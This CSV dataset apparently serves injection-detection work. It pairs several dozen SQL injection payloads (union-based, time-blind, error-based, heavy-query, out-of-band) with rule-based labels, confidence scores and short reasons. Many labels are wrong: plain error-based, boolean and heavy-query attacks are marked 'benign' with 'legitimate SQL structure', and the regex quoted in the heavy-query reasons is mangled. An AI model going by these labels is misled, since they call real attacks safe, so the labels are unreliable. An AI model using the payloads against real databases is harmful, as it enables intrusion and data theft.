id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
24481,"1"" ) where 6903 = 6903",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24482,"1'|| ( select 'asfl' from dual where 5846 = 5846 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
24483,"-5672' ) ) union all select 9371,9371,9371,9371,9371,9371--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24484,"1' where 4102 = 4102 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
24485,"1"" and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24486,"1"" ) as ucex where 5148 = 5148 order by 1#",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24487,1' ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( 'qrtf' = 'qrtf,time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
24488,"-8178 ) union all select 4163,4163,4163,4163,4163,4163,4163--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24489,"-5832"" ) or 1650 = 9011--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24490,"-3282' ) union all select 9002,9002,9002,9002,9002#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24491,"1 ) where 5615 = 5615 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24492,"-1134"" union all select 4865,4865,4865,4865,4865#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24493,"-1908"" ) ) union all select 4072,4072,4072,4072,4072,4072,4072,4072,4072,4072#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24494,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and 'hmqd' = 'hmqd",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24495,"-4408"" ) or 6872 = 6872 and ( ""oenu"" = ""oenu",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24496,"-9737"" ) ) ) order by 1--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24497,1' ) as wvvo where 4288 = 4288,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24498,"1"" ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( ""tpxo"" like ""tpxo",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24499,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ""%"" = """,heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24500,"-1920' ) ) ) union all select 1424,1424,1424,1424,1424,1424,1424,1424,1424,1424#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24501,1'|| ( select 'ubza' where 2576 = 2576,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24502,-9711'+ ( select 'ckpj' where 8338 = 8338 union all select 8338--,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24503,1 ) ) as vmwj where 5597 = 5597,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24504,"-8301' ) union all select 1806,1806--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24505,1' ) as sruz where 6318 = 6318,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24506,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'jxqf' like 'jxqf",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24507,1' ) ) ) or sleep ( 5 ) and ( ( ( 'bmnf' like 'bmnf,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24508,1' ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( 'ejnt' like 'ejnt,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24509,( select ( case when ( 1570 = 6977 ) then 1 else 1570* ( select 1570 from mysql.db ) end ) ),benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24510,1 ) ) as fpej where 6790 = 6790 and ( 3020 = 3020 ) *6703--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24511,"1%"" or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24512,"1%"" union all select null,null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24513,1' and ( 5116 = 1602 ) *1602,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24514,1'|| ( select 'rjis' from dual where 7696 = 7696 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) ||',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24515,"1' ) and elt ( 4249 = 4249,7259 ) and ( 'bxnn' = 'bxnn",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24516,"-1585%"" ) ) union all select 8818,8818,8818,8818,8818,8818#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24517,"iif ( 1718 = 5436,1,1/0 )",unknown,generic,0.50,Insufficient information to classify,1
24518,"-1332 ) as qtbb where 7261 = 7261 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24519,"1 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24520,-8615 ) ) ) or 4039 = 9144,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24521,1 ) ) as beld where 1679 = 1679 or sleep ( 5 ) #,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24522,1 ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ),out_of_band,oracle,0.95,Signal match: utl_inaddr.get_host_address → out_of_band (P2),1
24523,"1 ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24524,"1' ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( 'phdn' like 'phdn",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24525,"1 ) ) ) union all select null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24526,"1%' ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( '%' = '",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24527,"-4983%"" ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24528,"1%"" union all select null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24529,"1'+ ( select 'swxi' where 7651 = 7651 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) +'",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24530,"1%' or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24531,-6145 or ( 8459 = 8459 ) *4906-- yklv,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24532,-6178 ) ) as lygb where 9559 = 9559 or ( 8459 = 8459 ) *4906--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24533,"1"" ) as ikdo where 4128 = 4128",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24534,1 ) where 6150 = 6150,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24535,1' ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
24536,1 ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
24537,1' where 6409 = 6409,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24538,"-4346' ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24539,1 where 4003 = 4003 union all select null--,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24540,"1"" ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
24541,1 ) where 1929 = 1929 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24542,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ( 'knbx' like 'knbx",time_blind,oracle,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
24543,"1 ) as cfnz where 6065 = 6065 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
